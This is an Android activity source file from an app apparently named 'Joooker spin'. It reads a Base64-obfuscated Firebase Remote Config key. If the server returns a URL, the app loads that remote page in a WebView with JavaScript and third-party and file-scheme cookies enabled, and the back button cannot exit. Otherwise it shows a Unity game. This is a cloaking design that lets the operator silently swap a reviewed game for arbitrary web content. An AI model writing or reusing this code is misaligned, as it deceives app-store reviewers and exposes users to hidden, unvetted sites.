package com.joooker.spin.appp.view;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.ProgressBar;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.joooker.spin.appp.R;
import com.joooker.spin.appp.constanta.JoookerC;
import com.joooker.spin.appp.network.JoookerNetwork;
import com.joooker.spin.appp.webs.JoookerChrome;
import com.joooker.spin.appp.webs.JoookerWeb;
import com.unity3d.player.UnityPlayerActivity;

public class JookerView extends AppCompatActivity {

    FirebaseRemoteConfig joooker_FirebaseRemoteConfig;
    ProgressBar joooker_ProgressBar;
    WebView joooker_WebView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.joooker_view);
        joooker_ProgressBar = findViewById(R.id.joooker_progress);
        joooker_WebView = findViewById(R.id.joooker_view);

        joooker_FirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings joooker_FirebaseRometeConfigSettings = new FirebaseRemoteConfigSettings.Builder().build();
        joooker_FirebaseRemoteConfig.setDefaultsAsync(R.xml.joooker_url);
        joooker_FirebaseRemoteConfig.setConfigSettingsAsync(joooker_FirebaseRometeConfigSettings);
        try {
            Thread.sleep(1600);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        if(!joooker_FirebaseRemoteConfig.getString(new String(android.util.Base64.decode("am9vb2tlcl91cmw=", Base64.DEFAULT)))
                .equals(new String(Base64.decode("am9vb2tlcl91cmw=", Base64.DEFAULT))))
        {
            CookieManager win_CookieManager = CookieManager.getInstance();
            CookieManager.setAcceptFileSchemeCookies(true);
            win_CookieManager.setAcceptThirdPartyCookies(joooker_WebView, true);

            joooker_WebView.getSettings().setSupportZoom(true);
            joooker_WebView.getSettings().setDomStorageEnabled(true);
            joooker_WebView.loadUrl(joooker_FirebaseRemoteConfig.getString(new String(Base64.decode("am9vb2tlcl91cmw=", Base64.DEFAULT))));
            joooker_WebView.getSettings().setJavaScriptEnabled(true);
            joooker_WebView.getSettings().setUseWideViewPort(true);
            joooker_WebView.setWebChromeClient(new JoookerChrome(this, joooker_ProgressBar));
            joooker_WebView.setBackgroundColor(Color.WHITE);
            joooker_WebView.getSettings().setLoadsImagesAutomatically(true);
            joooker_WebView.getSettings().setLoadWithOverviewMode(true);
            joooker_WebView.getSettings().setBuiltInZoomControls(false);
            joooker_WebView.setWebViewClient(new JoookerWeb());
            joooker_WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            joooker_WebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);


            JoookerNetwork joookerNetwork = new JoookerNetwork(joooker_WebView);
            IntentFilter winIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            winIntentFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
            registerReceiver(joookerNetwork, winIntentFilter);

        }
        else {
            Intent i = new Intent(this, UnityPlayerActivity.class);
            startActivity(i);
            finish();
        }
    }
    @Override
    public void onBackPressed() {
        if(joooker_WebView.canGoBack()) joooker_WebView.goBack();
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode == JoookerC.Code)
            if (JoookerC.joookerCallBac == null) return;
        if (resultCode != RESULT_OK) {
            JoookerC.joookerCallBac.onReceiveValue(null);
            return;
        }
        Uri winResult = (data == null) ? JoookerC.joookerUrl : data.getData();
        if (winResult != null && JoookerC.joookerCallBac != null)
            JoookerC.joookerCallBac.onReceiveValue(new Uri[]{winResult});
        else if (JoookerC.joookerCallBac != null)
            JoookerC.joookerCallBac.onReceiveValue(new Uri[]{JoookerC.joookerUrl});
        JoookerC.joookerCallBac = null;
        super.onActivityResult(requestCode, resultCode, data);
    }


}